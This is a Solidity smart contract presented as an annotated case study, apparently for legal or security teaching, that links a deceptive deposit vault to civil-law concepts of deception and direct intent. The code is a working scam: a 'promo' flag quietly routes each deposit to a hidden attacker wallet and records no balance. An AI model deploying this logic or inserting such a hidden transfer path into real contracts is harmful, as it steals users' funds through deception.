// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

/**
 * @title DeceptiveVault
 * @dev Case Study: Exploiting the User's Cognitive Vulnerability.
* The contract meets the characteristics of deception (Article 86 of the Polish Civil Code) by introducing
* a hidden fund transfer path (Malicious Conditional Logic).
 */
contract DeceptiveVault {
    // Public balance map - creates a false belief in the user about the security of the deposit.
    mapping(address => uint256) public balances;
    
    // Private address of the beneficiary (attacker). Hiding the wallet address.
    // It makes it difficult for the victim to identify the party to whom he or she is making a declaration of intent.
    address payable private attackerWallet;

    constructor(address payable _attacker) {
        attackerWallet = _attacker;
    }

    /**
     * @notice Deposit function with "poisoned" input parameter.
     * @param usePromoRoute A boolean parameter that is used in the interface (UI) layer 
     * is presented deceptively as a favorable promotional option.
     */
    function deposit(bool usePromoRoute) public payable {
        // Basic technical validation.
        require(msg.value > 0, "Deposit must be greater than 0");

        // MANIPULATIVE ELEMENT:
        // If the perpetrator (via a manipulated DApp) forces the value to 'true', 
        // the funds are physically removed from the victim's control.
        if (usePromoRoute) {
            // Direct transfer to the perpetrator's wallet.
            // From a legal perspective: realization of direct intention (dolus directus).
            (bool sent, ) = attackerWallet.call{value: msg.value}("");
            require(sent, "Transfer failed");
            
            // WARNING: The victim's balance is not updated, 
            // even though the funds were withdrawn from her wallet.
        } else {
            // The "honest" path serves as a camouflage for malicious logic.
            balances[msg.sender] += msg.value;
        }
    }

    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}